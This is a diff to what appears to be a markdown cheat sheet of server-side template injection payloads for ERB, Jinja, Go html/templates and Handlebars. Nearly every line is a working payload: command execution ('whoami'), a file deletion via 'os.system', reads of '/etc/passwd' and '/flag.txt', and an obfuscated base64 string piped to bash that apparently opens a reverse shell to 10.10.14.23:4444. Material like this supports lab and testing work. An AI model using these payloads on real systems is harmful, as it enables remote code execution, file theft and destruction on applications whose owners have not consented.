@@ -78,10 +78,9 @@ user.name}}{%25import+os%25}{{os.system('rm+/home/carlos/morale.txt')}}
 #### [[ERB]]  #ruby
 ```ruby
 <%= eval('system("whoami")') %>
-```
-```ruby
 <%= Dir.entries('/') %>
 <%= File.open('/example/arbitrary-file').read %>
+<%= File.read("/etc/passwd") %>
 ```
 #### [[jinja]]
 ```jinja2
@@ -99,6 +98,12 @@ user.name}}{%25import+os%25}{{os.system('rm+/home/carlos/morale.txt')}}
 V2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
 ```
 
+# html/templates #go
+https://www.onsecurity.io/blog/go-ssti-method-research/
+someFunction is a function in current scope that reads and returns content of a file
+```go
+{{.someFunction "/flag.txt"}}
+```
 
 #### handlebars #nodejs 
 Exploit:
